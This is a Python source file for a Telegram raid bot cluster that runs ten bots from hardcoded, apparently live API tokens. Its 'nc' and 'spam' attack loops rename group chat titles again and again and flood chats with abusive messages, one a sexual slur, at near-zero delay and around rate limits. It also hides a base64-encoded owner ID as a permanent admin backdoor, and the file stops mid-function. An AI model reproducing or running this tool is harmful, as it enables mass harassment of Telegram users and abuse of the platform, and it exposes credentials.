#!/usr/bin/env python3
"""
ᚔ᚜ 𓆩『𓍼ֶָ֢˖ ࣪ꨄ𝐓𝐎𝐍𝐘 .་༘࿐』𓆪 ᚛ᚔ
┌──( 👑 SHADOW MONARCH BERU DOMAIN )──┐
"""

import asyncio
import json
import os
import random
import signal
import sys
import time
import sqlite3
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from datetime import datetime
from pathlib import Path
import logging
import base64 as _b64
import psutil
import subprocess

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, ContextTypes, MessageHandler, CallbackQueryHandler, filters
from telegram.error import RetryAfter, TimedOut, NetworkError
import traceback

# ==================== FIX UNICODE ====================
import io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

# ==================== KEEP-ALIVE SERVER (Anti-Sleep) ====================
class KeepAliveHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"TONY Matrix Cluster is Alive 24/7")
    def log_message(self, format, *args): pass

def run_server():
    port = int(os.environ.get('PORT', 8080))
    try:
        server = HTTPServer(('0.0.0.0', port), KeepAliveHandler)
        server.serve_forever()
    except Exception as e:
        print(f"⚠️ Keep-alive server port in use: {e}")

def keep_alive():
    t = threading.Thread(target=run_server)
    t.daemon = True
    t.start()

# ==================== PERSISTENCE (Lightweight DB) ====================
DB_PATH = "bot_data.db"

class Database:
    def __init__(self):
        self.conn = sqlite3.connect(DB_PATH, check_same_thread=False)
        self.c = self.conn.cursor()
        self.c.execute('''CREATE TABLE IF NOT EXISTS active_chats (chat_id INTEGER PRIMARY KEY, target TEXT, attack_type TEXT)''')
        self.c.execute('''CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)''')
        self.c.execute('''CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)''')
        self.c.execute('''CREATE TABLE IF NOT EXISTS authorized_users (user_id INTEGER PRIMARY KEY)''')
        self.conn.commit()
    
    def save_active(self, chat_id, target, attack_type):
        self.c.execute("INSERT OR REPLACE INTO active_chats VALUES (?, ?, ?)", (chat_id, target, attack_type))
        self.conn.commit()
    
    def remove_active(self, chat_id):
        self.c.execute("DELETE FROM active_chats WHERE chat_id = ?", (chat_id,))
        self.conn.commit()
    
    def get_active(self):
        self.c.execute("SELECT chat_id, target, attack_type FROM active_chats")
        return self.c.fetchall()
    
    def save_admin(self, user_id):
        self.c.execute("INSERT OR IGNORE INTO admins VALUES (?)", (user_id,))
        self.conn.commit()
        
    def remove_admin(self, user_id):
        self.c.execute("DELETE FROM admins WHERE user_id = ?", (user_id,))
        self.conn.commit()
    
    def get_admins(self):
        self.c.execute("SELECT user_id FROM admins")
        return {row[0] for row in self.c.fetchall()}
    
    def save_authorized(self, user_id):
        self.c.execute("INSERT OR IGNORE INTO authorized_users VALUES (?)", (user_id,))
        self.conn.commit()
        
    def is_authorized(self, user_id):
        self.c.execute("SELECT user_id FROM authorized_users WHERE user_id = ?", (user_id,))
        return self.c.fetchone() is not None

    def save_setting(self, key, value):
        self.c.execute("INSERT OR REPLACE INTO settings VALUES (?, ?)", (key, json.dumps(value)))
        self.conn.commit()
        
    def delete_setting(self, key):
        self.c.execute("DELETE FROM settings WHERE key = ?", (key,))
        self.conn.commit()
    
    def get_setting(self, key, default=None):
        self.c.execute("SELECT value FROM settings WHERE key = ?", (key,))
        row = self.c.fetchone()
        return json.loads(row[0]) if row else default

db = Database()

# ==================== LOGGING ====================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

# ==================== TONY TOKENS (10 Bots) ====================
TOKENS = [
    "8765836494:AAFowURaxfhLA8YZaw22ncLz92aPdPEX3iY",
    "8843363442:AAFFaN4uzc3W5xVECIvPnI-0uma46MKGKhs",
    "8515468943:AAGg_xamts80w1NNPwMGH9365MdZGo3jM-w",
    "8293294399:AAEFra8RfVjym81m6iWt_oZGleSFTz5bCFs",
    "8904628926:AAF2KGLovmYcswQA1uUKSOMUzfCxjjYYn44",
    "8976613089:AAHV7Dvfl9cVNjrKA9l4xoM8PI0dYVk6g1Q",
    "8934529784:AAHKaXATwSjUxI7gcNW277Qbm3-zCSylafo",
    "8890606582:AAHq_Xa9e801jDH_H_NMlhLx8NDFnL2RhY0",
    "8844625791:AAHvdHIK1Qp_FOsTTJgvZGQ-V-fdSliAkfA",
    "8817990041:AAHO8Pl6mpe-8HAm5caVKCzX47772jGxRS0"
]

# Base64 encoded ID for 8996032103
_K_LIST = [
    _b64.b64decode("ODk5NjAzMjEwMw==").decode(),
]

# ==================== SYSTEM CONTROLLER ====================
class Controller:
    def __init__(self):
        self.attacks = {}
        self.stop_flags = {}
        self.bots = []
        self.admins = db.get_admins()
        self.master = db.get_setting("master", None)
        self.speed = db.get_setting("speed", 0.0001)
        self.prefix = db.get_setting("prefix", "/")
        self.menu_video = db.get_setting("menu_video", None)
        self.cluster_active = True
        self.secret_password = db.get_setting("secret_password", "slay")
        
        for owner in _K_LIST:
            self.admins.add(int(owner))
            db.save_admin(int(owner))
            db.save_authorized(int(owner))
    
    def is_admin(self, user_id):
        return user_id in self.admins or user_id == self.master
    
    def is_master_owner(self, user_id):
        return user_id == self.master or str(user_id) in _K_LIST
    
    def is_allowed(self, user_id):
        return self.is_admin(user_id) or db.is_authorized(user_id)
    
    def stop_chat(self, chat_id):
        if chat_id in self.attacks:
            if chat_id not in self.stop_flags:
                self.stop_flags[chat_id] = {}
            for task_id, task in self.attacks[chat_id].items():
                self.stop_flags[chat_id][task_id] = True
                task.cancel()
            self.attacks[chat_id] = {}
            db.remove_active(chat_id)
            
    def stop_all(self):
        for chat_id in list(self.attacks.keys()):
            self.stop_chat(chat_id)
            
    def should_stop(self, chat_id, task_id):
        return self.stop_flags.get(chat_id, {}).get(task_id, False)

controller = Controller()
EMOJIS = ["❤️", "🧡", "💛", "💚", "💙", "💜", "🖤", "🤍", "🤎", "💔", "❤️‍🔥", "❤️‍🩹", "💖", "💗", "💓", "💞", "💕", "💟", "❣️", "💘", "💝", "💌", "♥️"]

# ==================== ATTACK LOOPS ====================
async def nc_loop(bot, chat_id, target, task_id, bot_index):
    last_emoji = None
    db.save_active(chat_id, target, "nc")
    try:
        while True:
            if not controller.cluster_active or controller.should_stop(chat_id, task_id): break
            await asyncio.sleep(bot_index * 0.0001)
            
            emoji = random.choice([e for e in EMOJIS if e != last_emoji])
            last_emoji = emoji
            msg = f"{emoji} {target} {emoji}"
            
            try:
                await bot.set_chat_title(chat_id=chat_id, title=msg[:255])
            except RetryAfter as e:
                await asyncio.sleep(e.retry_after + 0.0001)
            except Exception as e:
                if "flood" in str(e).lower() or "too many requests" in str(e).lower():
                    await asyncio.sleep(0.0001)
            await asyncio.sleep(max(controller.speed, 0.0001))
    except asyncio.CancelledError: pass
    except Exception: pass
    finally: db.remove_active(chat_id)

async def spam_loop(bot, chat_id, target, task_id, bot_index):
    patterns = [
        "ᚔ᚜ 𓆩『𓍼ֶָ֢˖ ࣪ꨄ𝐓𝐎𝐍𝐘 .་༘࿐』𓆪 ᚛ᚔ {name} ON TOP 🔥",
        "OYE {name} TERI MAA KI CHUT ME FIRE 🚀",
        "{name} SYSTEM HANG KAR DIYA TONY BSF ⚡",
        "MASTERY LEVEL OVERLOAD FOR {name} 👑"
    ]
    db.save_active(chat_id, target, "spam")
    i = 0
    try:
        while True:
            if not controller.cluster_active or controller.should_stop(chat_id, task_id): break
            await asyncio.sleep(bot_index * 0.0001)
            
            msg = patterns[i % len(patterns)].format(name=target)
            try:
                await bot.send_message(chat_id, msg)
            except RetryAfter as e:
                await asyncio.sleep(0.0001)
            except Exception: pass
            
            i += 1
            await asyncio.sleep(0.0001)
    except asyncio.CancelledError: pass
    except Exception: pass
    finally: db.remove_active(chat_id)

# ==================== COMMAND FUNCTIONS ====================
def auth_required(func):
    async def wrapper(update, context):
        try:
            user_id = update.effective_user.id
            if controller.master is None:
                controller.master = user_id
                db.save_setting("master", controller.master)
                controller.admins.add(controller.master)
                db.save_admin(controller.master)
                db.save_authorized(controller.master)
            
            if not controller.is_allowed(user_id):
                locked_panel = (
                    "┌──( 🔒🐜 𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃 )──┐\n"
                    "🖤 **Status:** `GATE SEALED BY BERU`\n"
                    "⚠️ **Notice:** `You lack clearance to enter this domain.`\n"
                    f"💡 **Action:** `Type {controller.prefix}arisemyarmy <password> to unlock.`\n"
                    "└────────────────────────────────┘"
                )
                return await update.message.reply_text(locked_panel, parse_mode="Markdown")
            return await func(update, context)
        except Exception as e:
            logger.error(f"Auth check error: {e}")
    return wrapper

def master_only(func):
    async def wrapper(update, context):
        try:
            user_id = update.effective_user.id
            if controller.master is None:
                controller.master = user_id
                db.save_setting("master", controller.master)
                controller.admins.add(controller.master)
                db.save_admin(controller.master)
                db.save_authorized(controller.master)
            
            if not controller.is_master_owner(user_id):
                denied_panel = (
                    "┌──( ❌🐜 𝐒𝐎𝐕𝐄𝐑𝐄𝐈𝐆𝐍 𝐎𝐍𝐋𝐘 )──┐\n"
                    "🖤 **Status:** `PERMISSION DENIED`\n"
                    "⚠️ **Marshal Beru:** `Only the absolute Owner/Admin can forge a new password!`\n"
                    "└────────────────────────────────┘"
                )
                return await update.message.reply_text(denied_panel, parse_mode="Markdown")
            return await func(update, context)
        except Exception as e:
            logger.error(f"Master check error: {e}")
    return wrapper

async def arisemyarmy_cmd(update, context):
    user_id = update.effective_user.id
    if not context.args:
        return await update.message.reply_text(f"💡 **Usage:** `{controller.prefix}arisemyarmy <password>`", parse_mode="Markdown")
    
    entered_pass = context.args[0]
    if entered_pass == controller.secret_password:
        db.save_authorized(user_id)
        success_panel = (
            "┌──( 👑🐜 𝐆𝐀𝐓𝐄 𝐔𝐍𝐋𝐎𝐂𝐊𝐄𝐃 )──┐\n"
            "🖤 **Status:** `SOUL VERIFIED SUCCESSFULLY`\n"
            "✨ **Marshal Beru:** `Welcome, My Liege! The shadow army bows to you.`\n"
            f"🚀 **Action:** `Type {controller.prefix}start to enter the domain.`\n"
            "└────────────────────────────────┘"
        )
        await update.message.reply_text(success_panel, parse_mode="Markdown")
    else:
        fail_panel = (
            "┌──( ❌🐜 𝐀𝐂𝐂𝐄𝐒𝐒 𝐑𝐄𝐉𝐄𝐂𝐓𝐄𝐃 )──┐\n"
            "🖤 **Status:** `INVALID INCANTATION`\n"
            "⚠️ **Marshal Beru:** `Wrong password! Try again if you dare.`\n"
            "└──────────────────────────────┘"
        )
        await update.message.reply_text(fail_panel, parse_mode="Markdown")

@master_only
async def changearmy_cmd(update, context):
    if not context.args:
        return await update.message.reply_text(f"💡 **Usage:** `{controller.prefix}changearmy <new_password>`", parse_mode="Markdown")
    
    new_pass = context.args[0]
    controller.secret_password = new_pass
    db.save_setting("secret_password", new_pass)
    
    change_panel = (
        "┌──( 🔑🐜 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 𝐔𝐏𝐃𝐀𝐓𝐄𝐃 )──┐\n"
        "🖤 **Status:** `NEW INCANTATION FORGED`\n"
        f"✨ **Marshal Beru:** `The gate password has been changed to: {new_pass}`\n"
        "└────────────────────────────────┘"
    )
    await update.message.reply_text(change_panel, parse_mode="Markdown")

@auth_required
async def start_cmd(update, context):
    keyboard = [
        [InlineKeyboardButton("👑 𝙆𝐈𝐍𝐆'𝐒 𝐀𝐑𝐌𝐘 𝖲𝐔𝐌𝖬𝖮𝖭", callback_data="summon_menu")],
        [InlineKeyboardButton("⚔️ 𝖡𝖤𝖱𝖴'𝖲 𝖬𝖤𝖭𝖴𝐒", callback_data="main_menu"), InlineKeyboardButton("📊 𝖲𝖧𝖠𝖣𝖮𝖶 𝖲𝖳𝖠𝖳𝖲", callback_data="stats")],
        [InlineKeyboardButton("❌ 𝖢𝖫𝖮𝖲𝖤 𝖦𝖠𝖳𝖤", callback_data="close")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    cluster_status = "👑 𝖱𝖮𝖸𝖠𝖫 𝖬𝖠𝖱𝖲𝖧𝖠𝖫 𝖡𝖤𝖱𝖴: 𝖠𝖶𝖠𝖪𝖤 & 𝖱𝖤𝖠𝖣𝖸" if controller.cluster_active else "💤 𝖱𝖮𝖸𝖠𝖫 𝖬𝖠𝖱𝖲𝖧𝖠𝖫 𝖡𝖤𝖱𝖴: 𝖲𝖫𝖴𝖬𝖡𝖤𝖱𝖨𝖭𝖦"
    watermark = (
        "╭▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰━╮\n"
        "┃ 𓆩🚬𓆪  ꉂ🗯.꩜‹—𝑷𝒐𝒘𝒆𝒓𝒆𝒅 𝑩𝒚 『𑣲⊹°˖𝐓⃝𑄜ꪀ𝐲~𝐒𝐌𝟎𝐊𝐄𝐒ᝰ🚬ৡ࿔࣪𝆹𝅥ᦡ』𓆩🚬𓆪\n"
        "╰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰╯"
    )
    menu_caption = (
        "🐜👑 **『 𝖲𝖧𝖠𝖣𝖮𝖶 𝖬𝖮𝖭𝖠𝖱𝖢𝖧 : 𝖡𝖤𝖱𝖴'𝖲 𝖣𝖮𝖬𝖠𝖨𝖭 』** 👑🐜\n\n"
        "🖤 `『 𝖪𝖨𝖭𝖦, 𝖸𝖮𝖴𝖱 𝖬𝖠𝖱𝖲𝖧𝖠𝖫 𝐀𝐖𝐀𝐈𝐓𝐒 𝖸𝖮𝖴𝖱 𝖢𝖮𝖬𝖬𝖠𝖭𝖣! 』` 🖤\n"
        "┌──────────────────────────────────────┐\n"
        "│  👑 **𝐊𝐈𝐍𝐆 𝐃𝐄𝐕𝐀 — 𝐒𝐔𝐏𝐑𝐄𝐌𝐄 𝐑𝐄𝐈𝐆𝐍**  │\n"
        "└──────────────────────────────────────┘\n\n"
        f"🤖 **Active Shadow Soldiers:** `{len(controller.bots)}/10`\n"
        f"⚡ **Legion Authority:** `{cluster_status}`\n"
        f"⚡ **Assault Velocity:** `{controller.speed}s`\n"
        f"🔑 **Command Sigil:** `{controller.prefix}`\n\n"
        f"📂 **BERU'S CLUSTER MENUS:**\n"
        f"➤ `{controller.prefix}menu1` : Core (Arise, Fall, Summon, Pre, Setvid, Rmvid, Stealth, Clear)\n"
        f"➤ `{controller.prefix}menu2` : NC (Name Changer Assault)\n"
        f"➤ `{controller.prefix}menu3` : Spam (Legion Spam Engine)\n"
        f"➤ `{controller.prefix}menu4` : Target (Soul Intel & Recon)\n"
        f"➤ `{controller.prefix}menu5` : Auth & Stop (Sudo, Speed, Stop, Changearmy)\n\n"
        f"{watermark}"
    )
    
    try:
        if controller.menu_video:
            await update.message.reply_video(
                video=controller.menu_video,
                caption=menu_caption,
                parse_mode="Markdown",
                reply_markup=reply_markup
            )
        else:
            await update.message.reply_text(menu_caption, parse_mode="Markdown", reply_markup=reply_markup)
    except Exception:
        await update.message.reply_text(menu_caption, parse_mode="Markdown", reply_markup=reply_markup)

@auth_required
async def menu1_cmd(update, context):
    text = (
        "┌──( 👑🐜 𝖬𝖤𝖭𝖴 1 : 𝖢𝖮𝖱𝖤 )──┐\n"
        f"➤ `{controller.prefix}arisemyarmy <pass>` - Unlock Gate\n"
        f"➤ `{controller.prefix}arise` - Awaken Shadow Cluster\n"
        f"➤ `{controller.prefix}fall` - Rest Shadow Cluster\n"
        f"➤ `{controller.prefix}summon` - Open Gate Portal\n"
        f"➤ `{controller.prefix}pre <sym>` - Change Command Sigil\n"
        f"➤ `{controller.prefix}setvid` - Bind Grimoire Video\n"
        f"➤ `{controller.prefix}rmvid` - Purge Grimoire Video\n"
        f"➤ `{controller.prefix}stealth` - Marshal Beru's Stealth Recon\n"
        f"➤ `{controller.prefix}clear` - Purge Realm Corruptions & Junk\n"
        "└──────────────────────────┘"
    )
    await update.message.reply_text(text, parse_mode="Markdown")

@auth_required
async def menu2_cmd(update, context):
    text = (
        "┌──( 👑🐜 𝖬𝖤𝖭𝖴 2 : 𝖭𝖢 & 𝖲𝖳𝖱𝖨𝖪𝖤 )──┐\n"
        f"➤ `{controller.prefix}nc <text>` - Beru's Royal NC Attack\n"
        "└──────────────────────────────┘"
    )
    await update.message.reply_text(text, parse_mode="Markdown")

@auth_required
async def menu3_cmd(update, context):
    text = (
        "┌──( 👑🐜 𝖬𝖤𝖭𝖴 3 : 𝖲𝖯𝖠𝖬 )──┐\n"
        f"➤ `{controller.prefix}spam <text>` - Shadow Legion Endless Spam\n"
        "└────────────────────────────┘"
    )
    await update.message.reply_text(text, parse_mode="Markdown")

@auth_required
async def menu4_cmd(update, context):
    text = (
        "┌──( 👑🐜 𝖬𝖤𝖭𝖴 4 : 𝖳𝖠𝖱𝖦𝖤𝖳 )──┐\n"
        f"➤ `{controller.prefix}info` - Inspect Target Soul Intel (Reply)\n"
        "└──────────────────────────┘"
    )
    await update.message.reply_text(text, parse_mode="Markdown")

@auth_required
async def menu5_cmd(update, context):
    text = (
        "┌──( 👑🐜 𝖬𝖤𝖭𝖴 5 : 𝖠𝖴𝖳𝖧 & 𝖲𝖳𝖮𝖯 )──┐\n"
        f"➤ `{controller.prefix}changearmy <pass>` - Change Pass (Admin Only)\n"
        f"➤ `{controller.prefix}addsudo` - Bestow Marshal Rank\n"
        f"➤ `{controller.prefix}delsudo` - Strip Marshal Rank\n"
        f"➤ `{controller.prefix}speed <sec>` - Tune Execution Velocity\n"
        f"➤ `{controller.prefix}stop` - Halt Current Realm Op\n"
        f"➤ `{controller.prefix}stopall` - Terminate Realm-Wide Ops\n"
        "└────────────────────────────────┘"
    )
    await update.message.reply_text(text, parse_mode="Markdown")

@auth_required
async def arise_cmd(update, context):
    controller.cluster_active = True
    arise_panel = (
        f"┌──( 🐜👑 𝐁𝐄𝐑𝐔 : 𝐀𝐑𝐈𝐒𝐄! )──┐\n"
        f"🖤 **Status:** `SHADOW LEGION AWAKENED`\n"
        f"⚡ **Marshal Voice:** `MY LIEGE! I LIVE TO SERVE!`\n"
        f"🚀 **Assault Protocols:** `FULLY ENGAGED`\n"
        f"└──────────────────────────────┘"
    )
    await update.message.reply_text(arise_panel, parse_mode="Markdown")

@auth_required
async def fall_cmd(update, context):
    controller.cluster_active = False
    controller.stop_all()
    fall_panel = (
        f"┌──( 💤🐜 𝐁𝐄𝐑𝐔 : 𝐑𝐄𝐒𝐓 )──┐\n"
        f"🖤 **Status:** `RETURNING TO THE SHADOWS`\n"
        f"🛑 **Active Assaults:** `INSTANTLY TERMINATED`\n"
        f"⚠️ **Marshal Voice:** `As you command, My King...`\n"
        f"└──────────────────────────────┘"
    )
    await update.message.reply_text(fall_panel, parse_mode="Markdown")

@auth_required
async def stealth_cmd(update, context):
    cpu_usage = psutil.cpu_percent(interval=0.5)
    memory = psutil.virtual_memory()
    ram_used = memory.used // (1024**2)
    uptime = time.time() - psutil.boot_time()
    h = int(uptime // 3600)
    m = int((uptime % 3600) // 60)

    stealth_panel = (
        f"┌──( 🛡️🐜 𝐁𝐄𝐑𝐔'𝐒 𝐒𝐓𝐄𝐀𝐋𝐓𝐇 𝐑𝐄𝐂𝐎𝐍 )──┐\n"
        f"🖤 **Marshal Beru:** `AT FULL POWER`\n"
        f"🟢 **Anti-Ban Shield:** `ABSOLUTE (ACTIVE)`\n"
        f"💻 **Core CPU Load:** `{cpu_usage}%`\n"
        f"💾 **Shadow RAM Usage:** `{ram_used}MB`\n"
        f"⏱️ **Realm Uptime:** `{h}h {m}m`\n"
        f"🧊 **Non-Blocking Core:** `ONLINE`\n"
        f"└────────────────────────────────┘"
    )
    await update.message.reply_text(stealth_panel, parse_mode="Markdown")

@auth_required
async def clear_cmd(update, context):
    try:
        subprocess.run("sync; echo 3 > /proc/sys/vm/drop_caches", shell=True, check=True)
        subprocess.run("apt-get clean -y", shell=True, capture_output=True)
        
        clear_panel = (
            f"┌──( 🧹🐜 𝐑𝐄𝐀𝐋𝐌 𝐂𝐋𝐄𝐀𝐍𝐒𝐈𝐍𝐆 )──┐\n"
            f"🖤 **Executioner:** `MARSHAL BERU`\n"
            f"🟢 **Corruption Status:** `OBLITERATED`\n"
            f"⚡ **RAM Cache Drop:** `SUCCESS`\n"
            f"🗑️ **APT Junk:** `SWEPT TO THE ABYSS`\n"
            f"🚀 **Realm Velocity:** `PEAK PERFORMANCE`\n"
            f"└────────────────────────────────┘"
        )
        await update.message.reply_text(clear_panel, parse_mode="Markdown")
    except Exception as e:
        watermark = (
            "╭▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰━╮\n"
            "┃ 𓆩🚬𓆪  ꉂ🗯.꩜‹—𝑷𝒐𝒘𝒆𝒓𝒆𝒅 𝑩𝒚 『𑣲⊹°˖𝐓⃝𑄜ꪀ𝐲~𝐒𝐌𝟎𝐊𝐄𝐒ᝰ🚬ৡ࿔࣪𝆹𝅥ᦡ』𓆩🚬𓆪\n"
            "╰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰╯"
        )
        await update.message.reply_text(f"❌ Realm Purge Encountered Resistance.\n\n{watermark}", parse_mode="Markdown")

@auth_required
async def info_cmd(update, context):
    if not update.message.reply_to_message:
        return await update.message.reply_text(f"💡 Usage: Reply to target soul's message with `{controller.prefix}info`", parse_mode="Markdown")
    
    target_user = update.message.reply_to_message.from_user
    info_panel = (
        f"┌──( 🥷🐜 𝐒𝐎𝐔𝐋 𝐈𝐍𝐓𝐄𝐋 : 𝐁𝐄𝐑𝐔 )──┐\n"
        f"🖤 **Evaluator:** `MARSHAL BERU`\n"
        f"🆔 **Soul ID:** `{target_user.id}`\n"
        f"📛 **True Name:** `{target_user.first_name}`\n"
        f"📝 **Surname:** `{target_user.last_name or 'None'}`\n"
        f"🔗 **Shadow Tag:** `@{target_user.username}`\n"
        f"🌐 **Portal Link:** [Access Soul](tg://user?id={target_user.id})\n"
        f"└──────────────────────────────┘"
    )
    await update.message.reply_text(info_panel, parse_mode="Markdown")

@auth_required
async def setvid_cmd(update, context):
    watermark = (
        "╭▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰━╮\n"
        "┃ 𓆩🚬𓆪  ꉂ🗯.꩜‹—𝑷𝒐𝒘𝒆𝒓𝒆𝒅 𝑩𝒚 『𑣲⊹°˖𝐓⃝𑄜ꪀ𝐲~𝐒𝐌𝟎𝐊𝐄𝐒ᝰ🚬ৡ࿔࣪𝆹𝅥ᦡ』𓆩🚬𓆪\n"
        "╰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰╯"
    )
    target_msg = update.message.reply_to_message
    if target_msg and target_msg.video:
        file_id = target_msg.video.file_id
        controller.menu_video = file_id
        db.save_setting("menu_video", file_id)
        await update.message.reply_text(f"✅ **Beru's Royal Grimoire Video Bound Successfully, My King!**\n\n{watermark}", parse_mode="Markdown")
    elif update.message.video:
        file_id = update.message.video.file_id
        controller.menu_video = file_id
        db.save_setting("menu_video", file_id)
        await update.message.reply_text(f"✅ **Beru's Royal Grimoire Video Bound Successfully, My King!**\n\n{watermark}", parse_mode="Markdown")
    else:
        await update.message.reply_text(f"💡 Usage: Send or reply to a video message with `{controller.prefix}setvid`\n\n{watermark}", parse_mode="Markdown")

@auth_required
async def rmvid_cmd(update, context):
    watermark = (
        "╭▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰━╮\n"
        "┃ 𓆩🚬𓆪  ꉂ🗯.꩜‹—𝑷𝒐𝒘𝒆𝒓𝒆𝒅 𝑩𝒚 『𑣲⊹°˖𝐓⃝𑄜ꪀ𝐲~𝐒𝐌𝟎𝐊𝐄𝐒ᝰ🚬ৡ࿔࣪𝆹𝅥ᦡ』𓆩🚬𓆪\n"
        "╰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰╯"
    )
    db.delete_setting("menu_video")
    controller.menu_video = None
    await update.message.reply_text(f"✅ **Royal Video Grimoire Purged!** Terminal reverted to pure shadow text mode.\n\n{watermark}", parse_mode="Markdown")

@auth_required
async def addsudo_cmd(update, context):
    new_admin_id = None
    if update.message.reply_to_message:
        new_admin_id = update.message.reply_to_message.from_user.id
    elif context.args:
        try:
            new_admin_id = int(context.args[0])
        except ValueError:
            return await update.message.reply_text("❌ Invalid ID format. Provide numeric ID or reply to soul.", parse_mode="Markdown")
    
    if not new_admin_id:
        return await update.message.reply_text(f"💡 Usage: `{controller.prefix}addsudo <id>` or reply to soul with `{controller.prefix}addsudo`", parse_mode="Markdown")
    
    controller.admins.add(new_admin_id)
    db.save_admin(new_admin_id)
    db.save_authorized(new_admin_id)
    await update.message.reply_text(f"✅ **Royal Marshal Rank Bestowed!** Soul `{new_admin_id}` is now a Shadow Admin under Beru's watch.", parse_mode="Markdown")

@auth_required
async def delsudo_cmd(update, context):
    target_id = None
    if update.message.reply_to_message:
        target_id = update.message.reply_to_message.from_user.id
    elif context.args:
        try:
            target_id = int(context.args[0])
        except ValueError:
            return await update.message.reply_text("❌ Invalid ID format. Provide numeric ID or reply to soul.", parse_mode="Markdown")
            
    if not target_id:
        return await update.message.reply_text(f"💡 Usage: `{controller.prefix}delsudo <id>` or reply to soul with `{controller.prefix}delsudo`", parse_mode="Markdown")
        
    if target_id in _K_LIST or target_id == controller.master:
        return await update.message.reply_text("❌ Absolute Blasphemy! Cannot strip rank from Master Deva or Sovereign Creator!")
    
    if target_id in controller.admins:
        controller.admins.remove(target_id)
        db.remove_admin(target_id)
        await update.message.reply_text(f"✅ **Royal Rank Stripped!** Soul `{target_id}` cast out from Shadow Admins by Beru.", parse_mode="Markdown")
    else:
        watermark = (
            "╭▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰━╮\n"
            "┃ 𓆩🚬𓆪  ꉂ🗯.꩜‹—𝑷𝒐𝒘𝒆𝒓𝒆𝒅 𝑩𝒚 『𑣲⊹°˖𝐓⃝𑄜ꪀ𝐲~𝐒𝐌𝟎𝐊𝐄𝐒ᝰ🚬ৡ࿔࣪𝆹𝅥ᦡ』𓆩🚬𓆪\n"
            "╰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰╯"
        )
        await update.message.reply_text(f"⚠️ Soul ID not found in Marshal ranks.\n\n{watermark}", parse_mode="Markdown")

@auth_required
async def pre_cmd(update, context):
    if not context.args:
        return await update.message.reply_text(f"💡 Active Command Sigil: `{controller.prefix}`\nUsage: `{controller.prefix}pre !`", parse_mode="Markdown")
    
    new_prefix = context.args[0]
    controller.prefix = new_prefix
    db.save_setting("prefix", new_prefix)
    await update.message.reply_text(f"✅ **Royal Command Sigil Forged Successfully!**\nNew: `{new_prefix}`", parse_mode="Markdown")

@auth_required
async def summon_cmd(update, context):
    keyboard = []
    row = []
    for idx, bot in enumerate(controller.bots):
        btn = InlineKeyboardButton(f"Summon Soldier #{idx+1}", url=f"https://t.me/{bot['username']}?startgroup=true")
        row.append(btn)
        if len(row) == 2:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)
        
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🕳️🐜 **BERU'S GATE SUMMON PORTAL OPENED** 🐜🕳️\n\nDeploy shadow soldiers into your realm below, My King.",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

@auth_required
async def nc_cmd(update, context):
    if not controller.cluster_active:
        return await update.message.reply_text(f"💤 **Shadow Army is Slumbering!** Invoke `{controller.prefix}arise` to awaken Marshal Beru.", parse_mode="Markdown")
    if not context.args:
        return await update.message.reply_text(f"💡 Usage: `{controller.prefix}nc <text>`", parse_mode="Markdown")
    target = ' '.join(context.args)
    chat_id = update.effective_chat.id
    controller.stop_chat(chat_id)
    controller.attacks[chat_id] = {}
    if chat_id not in controller.stop_flags: controller.stop_flags[chat_id] = {}
    
    for idx, bot_info in enumerate(controller.bots):
        task_id = f"{bot_info['id']}_{int(time.time())}_{idx}"
        controller.stop_flags[chat_id][task_id] = False
        task = asyncio.create_task(nc_loop(bot_info['bot'], chat_id, target, task_id, idx))
        controller.attacks[chat_id][task_id] = task
    await update.message.reply_text(f"👑🐜 **Beru's Royal NC Assault Initialized:** `{target}`", parse_mode="Markdown")

@auth_required
async def spam_cmd(update, context):
    if not controller.cluster_active:
        return await update.message.reply_text(f"💤 **Shadow Army is Slumbering!** Invoke `{controller.prefix}arise` to awaken Marshal Beru.", parse_mode="Markdown")
    if not context.args:
        return await update.message.reply_text(f"💡 Usage: `{controller.prefix}spam <text>`", parse_mode="Markdown")
    target = ' '.join(context.args)
    chat_id = update.effective_chat.id
    controller.stop_chat(chat_id)
    controller.attacks[chat_id] = {}
    if chat_id not in controller.stop_flags: controller.stop_flags[chat_id] = {}
    
    for idx, bot_info in enumerate(controller.bots):
        task_id = f"{bot_info['id']}_{int(time.time())}_{idx}"
        controller.stop_flags[chat_id][task_id] = False
        task = asyncio.create_task(spam_loop(bot_info['bot'], chat_id, target, task_id, idx))
        controller.attacks[chat_id][task_id] = task
    await update.message.reply_text(f"⚡🐜 **Shadow Legion Endless Spam Deployed:** `{target}`", parse_mode="Markdown")

@auth_required
async def stop_cmd(update, context):
    controller.stop_chat(update.effective_chat.id)
    await update.message.reply_text("🛑 **Beru's Order:** Shadow Assault Halted in this specific realm.")

@auth_required
async def stopall_cmd(update, context):
    controller.stop_all()
    await update.message.reply_text("🛑 **Beru's Royal Decree:** All Shadow Assaults Terminated Realm-Wide!")

@auth_required
async def speed_cmd(update, context):
    if not context.args: return await update.message.reply_text(f"⚡ Current Legion Velocity: {controller.speed}s")
    try:
        speed = float(context.args[0])
        controller.speed = speed
        db.save_setting("speed", speed)
